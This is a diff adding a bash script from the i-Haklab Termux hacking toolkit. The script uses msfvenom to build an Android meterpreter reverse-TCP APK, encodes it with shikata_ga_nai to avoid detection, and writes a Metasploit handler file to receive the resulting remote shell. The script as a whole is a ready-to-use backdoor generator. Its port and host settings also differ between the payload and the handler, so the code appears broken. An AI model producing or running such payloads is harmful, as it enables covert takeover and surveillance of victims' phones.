@@ -1,0 +1,25 @@
+#!/bin/bash
+#This file is part of i-Haklab command
+
+if [ -d /data/data/com.termux/files/home/i-Haklab ]; then
+        iHAKLAB=/data/data/com.termux/files/home/i-Haklab                                   else
+        iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
+fi
+
+source $iHAKLAB/.set/libexec/colors
+source $iHAKLAB/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+
+if [ ! -d ~/java/handler ]; then
+	mkdir -p ~/java/handler
+fi
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$3 LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+
+echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
+echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
+echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
+echo "set LPORT 4546" >> ~/java/handler/outlan.apk.rc
+echo "run" >> ~/java/handler/outlan.apk.rc
+printf "$Y[i]->$W Payload saved as$G outlan.apk$W\n"
+printf "$Y[i]->$W Handler file saved as$G outlan.apk.rc$W\n"
